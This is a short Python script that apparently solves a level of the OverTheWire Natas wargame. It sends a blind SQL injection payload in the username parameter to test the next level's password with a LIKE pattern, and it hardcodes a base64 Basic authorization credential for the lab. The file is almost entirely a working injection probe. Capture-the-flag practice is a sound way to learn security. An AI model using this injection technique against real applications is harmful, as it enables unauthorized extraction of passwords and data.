import requests

url = "http://natas15.natas.labs.overthewire.org/"

querystring = {"debug":"yes","username":"natas16\" and password like \"w%"}

headers = {
    'authorization': "Basic bmF0YXMxNTpBd1dqMHc1Y3Z4clppT05nWjlKNXN0TlZrbXhkazM5Sg==",
    'cache-control': "no-cache",
    'postman-token': "a485c7b5-2c71-52cf-fa16-62c92545ecf4"
    }

response = requests.request("GET", url, headers=headers, params=querystring)

print(response.text)
